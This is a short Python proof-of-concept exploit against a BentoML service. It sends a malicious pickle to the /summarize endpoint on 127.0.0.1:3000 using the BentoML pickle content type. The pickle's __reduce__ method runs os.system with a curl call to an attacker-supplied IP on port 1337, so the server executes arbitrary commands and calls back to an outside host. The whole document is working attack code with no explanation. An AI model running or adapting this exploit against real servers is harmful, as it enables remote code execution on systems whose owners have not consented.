import pickle, os, requests

ip_address = input("give me your IP address which is accessible by the docker instances:\n")
print(f"curl {ip_address}:1337")
class P(object):
    def __reduce__(self):
        return (os.system, (f"curl {ip_address}:1337",))

requests.post('http://127.0.0.1:3000/summarize', data=pickle.dumps(P()),
              headers={"Content-Type": "application/vnd.bentoml+pickle"})
